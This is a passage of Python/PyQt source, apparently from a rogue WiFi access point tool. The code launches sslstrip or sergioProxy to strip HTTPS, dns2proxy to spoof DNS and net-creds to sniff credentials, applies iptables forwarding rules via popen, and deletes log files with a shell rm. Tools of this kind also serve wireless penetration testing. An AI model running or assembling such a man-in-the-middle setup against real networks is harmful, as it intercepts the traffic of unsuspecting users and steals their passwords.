            self.plugins,self.ProxyPluginsTAB._PluginsToLoader)
            self.Threadsslstrip.setObjectName("sslstrip")
            self.Apthreads['RougeAP'].append(self.Threadsslstrip)

        elif not self.PopUpPlugins.check_sslstrip.isChecked() and self.PopUpPlugins.check_sergioProxy.isChecked():
            self.Threadsslstrip = Thread_sergioProxy(self.ConfigTwin['PortRedirect'],
            self.plugins,self.ProxyPluginsTAB._PluginsToLoader)
            self.Threadsslstrip.setObjectName("sslstrip")
            self.Apthreads['RougeAP'].append(self.Threadsslstrip)

        elif self.PopUpPlugins.check_sergioProxy.isChecked() and self.PopUpPlugins.check_sergioProxy.isChecked():
            self.Threadsslstrip = Thread_sergioProxy(self.ConfigTwin['PortRedirect'],
            self.plugins,self.ProxyPluginsTAB._PluginsToLoader)
            self.Threadsslstrip.setObjectName("sslstrip")
            self.Apthreads['RougeAP'].append(self.Threadsslstrip)

        if self.PopUpPlugins.check_dns2proy.isChecked():
            Thread_dns2proxy = ProcessThread(['python','Plugins/dns2proxy/dns2proxy.py'])
            Thread_dns2proxy.setName('Dns2Proxy')
            self.Apthreads['RougeAP'].append(Thread_dns2proxy)

        if self.PopUpPlugins.check_netcreds.isChecked():
            Thread_netcreds = ProcessThread(['python','Plugins/net-creds/net-creds.py','-i',
            str(self.selectCard.currentText())])
            Thread_netcreds.setName('Net-Creds')
            self.Apthreads['RougeAP'].append(Thread_netcreds)

        if self.PopUpPlugins.check_sslstrip.isCheckable():
            Thread_frontServer = ThreadFrontServer(self)
            Thread_frontServer.setName('FrontServer')
            self.Apthreads['RougeAP'].append(Thread_frontServer)

        iptables = []
        for index in xrange(self.FSettings.ListRules.count()):
           iptables.append(str(self.FSettings.ListRules.item(index).text()))
        for rules in iptables:
            if search('--append FORWARD --in-interface',
            rules):popen(rules.replace('$$',self.ConfigTwin['AP_iface']))
            elif search('--append POSTROUTING --out-interface',rules):
                popen(rules.replace('$$',str(Refactor.get_interfaces()['activated'])))
            else:popen(rules)

        #self.PumpSettingsTAB.GroupArea.setEnabled(False)
        self.progress.change_color('#FFA500')
        for thread in self.Apthreads['RougeAP']:
            thread.start()
            self.progress.setText(thread.getNameThread())
            self.progress.update_bar_simple(20)
            QThread.sleep(3)
        self.progress.setValue(100)
        self.progress.change_color('grey')
        self.progress.setText('')
        if self.FSettings.Settings.get_setting('dockarea','advanced',format=bool):
            self.PumpSettingsTAB.doCheckAdvanced()
            if hasattr(self,'dockAreaList'):
                filelist = [ f for f in listdir('Logs/AccessPoint/.') if f.endswith('.log.offset') ]
                for f in filelist: system('rm Logs/AccessPoint/{}'.format(f))
                for dock in self.dockAreaList.keys():
                    self.dockAreaList[dock].RunThread()

    def create_sys_tray(self):
        self.sysTray = QSystemTrayIcon(self)
        self.sysTray.setIcon(QIcon('Icons/icon.ico'))
        self.sysTray.setVisible(True)
        self.connect(self.sysTray,
        SIGNAL('activated(QSystemTrayIcon::ActivationReason)'),
        self.on_sys_tray_activated)
        self.sysTrayMenu = QMenu(self)
        self.sysTrayMenu.addAction('FOO')

    def on_sys_tray_activated(self, reason):
        if reason == 3:self.showNormal()
        elif reason == 2:self.showMinimized()
